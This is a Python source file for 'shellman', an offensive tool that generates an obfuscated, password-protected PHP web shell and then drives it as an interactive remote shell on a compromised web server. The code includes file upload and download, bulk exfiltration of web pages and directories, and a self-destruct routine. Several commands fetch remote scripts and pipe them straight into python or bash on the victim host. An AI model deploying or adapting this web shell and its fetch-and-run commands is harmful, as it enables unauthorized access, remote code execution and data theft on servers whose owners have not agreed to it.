#!/usr/bin/python
# -*- coding: iso-8859-15 -*-
#
## This program is free software: you can redistribute it and/or modify
## it under the terms of the GNU General Public License as published by
## the Free Software Foundation, either version 3 of the License, or
## (at your option) any later version.
#
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
## GNU General Public License at (http://www.gnu.org/licenses/) for
## more details.

try:
	from termcolor import colored
except:
	print " [X] Please run this command to continue:"
	print " [*]\033[1m apt-get install python-pip;pip install termcolor"
	exit()

from subprocess import call
from argparse import ArgumentParser
from readline import parse_and_bind, set_completer, set_completer_delims
from tempfile import NamedTemporaryFile
from requests import post
from filecmp import cmp
from hashlib import md5
from random import choice, randint
from string import ascii_letters, digits
from re import findall
from os import system, path

parser = ArgumentParser(prog='shellman', usage='./shellman.py -u URL')
parser.add_argument('-u', "--url", type=str, help='PHP Shell URL')
parser.add_argument('-g', "--generate", action="store_true", help='Generate PHP shell and password')
args = parser.parse_args()

def execcmd(cmd):
	return post(shell, data={'c': cmd, 'p': pw }).text.strip()

def genshell():
	password = "".join([choice(ascii_letters + digits + '!?|/.,<>@#$%^&*(){}[]~:;_+=-`') for n in xrange(randint(60,150))]) + '\n'
	passw = md5(password.encode()).hexdigest()
	pshell = '''if(isset($_POST['c'])){if(md5($_POST['p'])=='%s'){system($_POST['c']);}}elseif(isset($_POST['Fb7ICH50'])){echo file_get_contents($_POST['Fb7ICH50']);}else{file_put_contents("mdOxaVv7", file_get_contents("php://input"));}''' %(passw)
	phppayload = '<?php eval(base64_decode("' + pshell.encode('base64').replace('\n', '') + '")); ?>'
	modfile('shell.php', 'w', phppayload)
	modfile('pass', 'w', password)
	return colored('\033[1m [*] shell.php generated', 'green')

def modfile(file, mode, data):
	fo = open(file, mode)
	if findall('w', mode):
		fo.write(data)
	else:
		return fo.read()
	fo.close

def findhome():
	global home
	home = False
	pdir = execcmd('pwd')
	while not home:
		if execcmd('cd ' + pdir + '/..;echo lol > chk5;cat chk5;rm chk5') !=  '':
			pwd = execcmd('cd ' + pdir + '/..;pwd')
			pdir = pwd
		else:
			home = pdir
	return home

def uploadfile(localfile, remotefile):
	chkpath(localfile, remotefile)
	post(shell, data=modfile(lfile, 'rb', ''))
	execcmd("mv mdOxaVv7 " + rfile)

def downloadfile(remotefile, localfile):
	chkpath(localfile, remotefile)
	modfile(lfile, 'wb', post(shell, data={'Fb7ICH50': rfile }).content)

def complete(text, state):
	if findall('/', text):
		dtext = ''.join(text.split('/')[-1:])
		sp = text.split('/')[:-1]
		lspath = '/'.join(sp)
		if not lspath:
			lspath = '/'
		cmd = 'cd ' + lspath + ';ls'
		newls = execcmd(cmd).split('\n')
		dirchk = execcmd('if [ -d ' + lspath + ' ];then echo yep;fi')
		if dirchk != 'yep':
			newls = ''
		for fil in newls:
			if fil.startswith(dtext):
				if not state:
					dirck = execcmd('if [ -d ' + lspath + '/' + fil + ' ];then echo yep;fi')
					if dirck != 'yep':
						if lspath == '/':
							return lspath + fil
						else:
							return lspath + '/' + fil
					else:
						if lspath == '/':
							return lspath + fil + '/'
						else:
							return lspath + '/' + fil + '/'
				else:
					state -= 1

	else:
		cmd = 'cd ' + pwd + ';ls'
		pwdls = execcmd(cmd).split('\n')
		for ecmd in ecmds:
				pwdls.append(ecmd)
		for fil in pwdls:
			if fil.startswith(text):
				if not state:
					return fil
				else:
					state -= 1

def mktmpfile(data):
	global tmpname
	tmpf = NamedTemporaryFile(mode='w+r', delete=False)
	tmpname =tmpf.name.strip('\n')
	tf = open(tmpname, 'w')
	tf.write(data)
	tf.close
	return tmpname

def textedit(editor):
	system('clear')
	if not findall('/',fs[1]):
		upl = pwd + '/' + fs[1]
	else:
		upl = fs[1]
	tc = mktmpfile('')
	n = mktmpfile('')

	if execcmd('cd ' + pwd + ';cat ' + fs[1]) != '':
		downloadfile(fs[1],n)
		system('cp ' + n + ' ' + tc)
	try:
		call([editor, n])
	except:
		print colored(' [X] \033[1m' + fs[0] + ' not installed!', 'red')
	try:
		cmpchk = cmp(n, tc)
	except:
		cmpchk = False
	if open(n, 'r').read() != '' and not cmpchk:
		system('clear')
		try:
			system('clear')
			uploadfile(n, upl)
			print colored("\033[1m [*] " + upl + " saved.\033[0m",'green')
			system('rm -rf ' + n + ' ' + tc)
		except:
		 	print colored(' [X] \033[1mError uploading file, saved to ' + tmpname, 'red')
	else:
	 	print colored(' [X] \033[1m' + fs[0] + ' cancelled.','red')
		system('rm -rf ' + n + ' ' + tc)

def gatherfiles(extension, directory):
	try:
		if extension != '/':
			lst = execcmd('echo "$(find ' + directory + ' | grep ' + extension +  ' )" | cut -d "/" -f 2-99').split('\n')
		else:
			lst = execcmd('echo "$(find ' + directory + ')"').split('\n')
			extension = path.basename(dird)
		if ''.join(lst) != '':
			execcmd('tar cfz ' + extension + '.tar.gz ' + ' '.join(lst))
			downloadfile(extension + '.tar.gz', cleanname + '_' + extension +'.tar.gz' )
			execcmd('rm ' + extension + '.tar.gz')
			print colored(' [*] ' + extension + ' found: ', 'green') + '\033[1m' + colored(' '.join(lst), 'blue')
			print colored('\033[1m [*] ' + extension + ' downloaded to ' + lfile, 'green')
	except:
	  	pass

def chkpath(localfile, remotefile):
	global lfile, rfile
	if not findall('/',remotefile):
		rfile = pwd + '/' + remotefile
	else:
		rfile = remotefile
	if not findall('/',localfile):
		lfile = '/tmp/' + localfile
	else:
		lfile = localfile

try:
	pw = modfile('pass', 'r', '')
except:
	args.generate = True

if args.generate:
	print genshell()
	exit()

elif args.url:
	if args.url.startswith('http'):
		shell = args.url
	else:
		shell = 'http://' + args.url
else:
	shell = "http://localhost/shell.php"

cleanname = shell.split('//', 1)[1].split('/', 1)[0]

try:
	print colored(' [>] Connecting..', 'yellow')	## Try to connect to the shell
	who = execcmd("whoami")
	host = execcmd("hostname")
	if who == 'root':
		prompt = '# '
	elif who == '' or findall('<html', who) or findall('<HTML', who):
		exit()
	else:
		prompt = '$ '
	shebang = colored(who + '@' + host, 'red') + ':'
	pwd = execcmd("pwd")
	extip = execcmd("wget icanhazip.com -O - -q")
	print colored('''	┏━┓╻ ╻┏━╸╻  ╻  ┏┳┓┏━┓┏┓╻
	┗━┓┣━┫┣╸ ┃  ┃  ┃┃┃┣━┫┃┗┫
	┗━┛╹ ╹┗━╸┗━╸┗━╸╹ ╹╹ ╹╹ ╹
			by d4rkcat''', 'yellow')
	print colored(' [*] Connected to: \033[1m\t' + who + '@' + cleanname + ' (' + extip + ')', 'green')
	print colored(' [*] Web-root: \033[1m\t\t' + findhome(), 'green')
	print colored(' [*] ' + '\033[1m' + execcmd("uname -a"), 'blue')
	shelloc =  home + '/' + shell.split('//', 1)[1].split('/', 1)[1]
except:
	print colored(' [X] Cannot connect to ' + '\033[1m' + shell, 'red')
	exit()
ecmds = [ 'pico', 'vi', 'nano', 'emacs', 'download', 'upload', 'echo' , 'cat', 'tar', 'grep', 'find', 'sed', 'awk', 'diff', 'ifconfig', 'arp', 'route', 'getprivs' , 'getpages', 'getdir', 'getenum', 'selfdestruct' ]

while True:
	parse_and_bind("tab: complete")
	set_completer(complete)
	set_completer_delims(' \t\n;')
	try:											## Get the command from the user
		command = raw_input('\033[1m' + shebang + '\033[1m' + colored(pwd,'blue') + prompt + '\033[0m')
	except:
		print colored('\033[1m [*] Bye!', 'green')
		exit()

	if command.startswith('nano') or command.startswith('vi') or command.startswith('pico') or command.startswith('emacs'):
		fs = command.split(' ')						## Text Editor
		if len(fs) > 1:
			textedit(fs[0])
		else:
			print colored(' [X] \033[1m' + fs[0] + ' requires one argument, file to edit','red')
		command = ''

	elif command.startswith('upload'):				## Upload a file
		fs = command.split(' ')
		if len(fs) > 1:
			try:
				if len(fs) > 2:
					uploadfile(fs[1], fs[2])
					print colored("\033[1m [*] " + lfile + " uploaded to " + fs[2], 'green')
				else:
					bname = path.basename(fs[1])
					uploadfile(fs[1], bname)
					print colored("\033[1m [*] " + lfile + " uploaded to " + bname, 'green')
			except:
				print colored(' [X] \033[1mError uploading ' + lfile, 'red')
		else:
			print colored(' [X] \033[1mupload requires one argument, /path/to/localfile', 'red')
		command = ''

	elif command.startswith('download'):			## Download a file
		fs = command.split(' ')
		if len(fs) > 1:
			try:
				if len(fs) > 2:
					downloadfile(fs[1], fs[2])
				else:
					dt = mktmpfile('')
					downloadfile(fs[1], dt)
				print colored("\033[1m [*] " + fs[1] + " downloaded to " + lfile, 'green')
			except:
				print colored(' [X]\033[1mError downloading ' + fs[1], 'red')
		else:
			print colored(' [X] \033[1mdownload requires one argument, remotefile', 'red')
		command = ''

	elif command == 'exit' or command == 'e' or command == 'q':	
		print colored('\033[1m [*] Bye!', 'green')
		exit()										## Quit

	elif command == 'clear' or command == 'c':		## Clear the screen
		system('clear')
		command = ''

	elif command.startswith('getprivs'):			## Priv-esc checker
		print colored(' [*] \033[1mDownloading and executing ', 'blue') + colored('\033[1mpriv-esc-checker.py', 'green')
		privs = execcmd('wget -q https://raw.github.com/d4rkcat/lpec/master/lpec.py -O - | $(which python)') + '\n'
		privf = '/tmp/' + cleanname + '_privlog'
		modfile(privf, 'w', privs)
		print privs
		print colored('\033[1m [*] Results saved to ' + privf, 'green')
		command=''

	elif command.startswith('getpages'):			## Download webpages
		pages = ['html', 'php', 'asp', 'js', 'cgi']
		for ext in pages:
			gatherfiles(ext, '/' + home)
		command = ''

	elif command.startswith('selfdestruct'):		## Self-Destruct
		if raw_input(colored(' [X]' + '\033[1m' + ' Warning: Will delete PHP Shell, Are you sure? (yes/no): ', 'red')) == 'yes':
			execcmd('rm -rf ' + shelloc)
			print colored(' [*] \033[1mBoom', 'red' )
			exit()
		else:
			print colored(' [X]\033[1m Self-Destruct cancelled', 'green')
			command = ''

	elif command.startswith('getenum'):				## Linux enum
		print colored(' [*] \033[1mDownloading and executing ', 'blue') + colored('\033[1menum.sh', 'green')
		enum = execcmd('wget 1.servebeer.com -q -O - | bash')
		enumf = '/tmp/' + cleanname + '_enum'
		modfile(enumf, 'w', enum + '\n')
		print enum
		print colored('\033[1m [*] Results saved to ' + enumf, 'green')
		command=''

	elif command.startswith('getdir'):				## Download diretories
		try:
			fs = command.split(' ')
			if not findall('/', fs[1]):
				dird = pwd + '/' + fs[1]
			gatherfiles( '/', dird )
		except:
			print colored(' [X] \033[1mgetdir requires one argument, remotedir', 'red')
		command = ''

	else:
		cmd = 'cd ' + pwd + ';' + command

	if command.startswith('cd '):					## Change Directory (cd)
		pwd = execcmd(cmd  + ';pwd')

	cmdreplace = {"ifconfig":"/sbin/ifconfig", "arp":"/usr/sbin/arp", "route":"/sbin/route", "ls":"cd " + pwd + ";ls -x"}
	for key, value in cmdreplace.iteritems():
		if key in command:
			cmd = command.replace(key, value)		## Fix some commands
	if command:
			stdout = execcmd(cmd + ' 2>&1')			
			if stdout:
				print stdout						## Print stdout and stderr
